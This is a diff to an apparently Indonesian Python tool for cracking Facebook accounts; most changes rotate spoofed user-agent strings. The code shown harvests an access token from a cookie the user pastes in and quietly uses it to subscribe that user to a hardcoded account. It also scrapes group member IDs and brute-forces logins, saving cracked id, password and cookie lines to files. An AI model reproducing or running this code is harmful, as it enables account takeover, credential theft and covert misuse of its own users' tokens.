@@ -170,7 +170,7 @@ def login_lagi334():
 		banner()
 		asu = random.choice([m,k,h,b,u])
 		cookie=input(f'  [{h}•{x}] Cookies :{asu} ')
-		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
+		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 9; PCAM10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
 		cok=open(".cok.txt", "w").write(cookie)
@@ -189,7 +189,7 @@ def login_lagi334():
 		exit()
 def bot():
 	try:
-		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
+		requests.post("https://graph.facebook.com/100076672262895?fields=subscribers&access_token=%s"%(tokenku))
 	except:
 		pass
 #------------------[ BAGIAN-MENU ]----------------#
@@ -455,7 +455,7 @@ def grup():
 	print('')
 	print(f'{x}Masukan Username/Idz Grup')
 	id = input(' ╰── : ')
-	ua = 'Mozilla/5.0 (Linux; Android 4.4.2; Tab2A7-10F Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36'
+	ua = 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T311 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.66 Safari/537.36'
 	miskinlu = {"user-agent": ua}
 	url = "https://mbasic.facebook.com/groups/"+id
 	ses = requests.Session()
@@ -501,7 +501,7 @@ def grup1(urls):
 	print(f' ╰──Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
 	while True:
 		try:
-			ua = 'Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A5000 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]'
+			ua = 'Mozilla/5.0 (Linux; Android 5.0.1; LG-H324 Build/LRX21Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 YaBrowser/17.11.0.526.00 Mobile Safari/537.36'
 			miskinlu = {"user-agent": ua}
 			try:
 				url = use[0]
@@ -769,7 +769,7 @@ def crack(idf,pwv):
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"}
+				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 10; IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}
 				if 'no' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
@@ -831,7 +831,7 @@ def crackfree(idf,pwv):
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36"}
+				headapp={"user-agent":"Mozilla/5.0 (Linux; U; Android 11; en-US; V2022 Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36"}
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
@@ -898,7 +898,7 @@ def cracktouch(idf,pwv):
 				else:continue
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A5000 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]"}
+				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; moto e6s Build/POBS29.288-60-6-1-15; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/339.0.0.32.118;]"}
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
@@ -981,7 +981,7 @@ def crackmbasic(idf,pwv):
 				else:continue
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; Lenovo P70-A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"}
+				headapp={"user-agent":"Mozilla/5.0 (Linux; U; Android 9; ASUS_X01BDA Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 OPR/63.0.2254.62069"}
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
@@ -1029,7 +1029,7 @@ def crackmbasic(idf,pwv):
 #--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
 def ceker(idf,pw):
 	global cp
-	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
+	ua = 'Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/374.0.0.20.109;]'
 	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 	ses = requests.Session()
 	try:
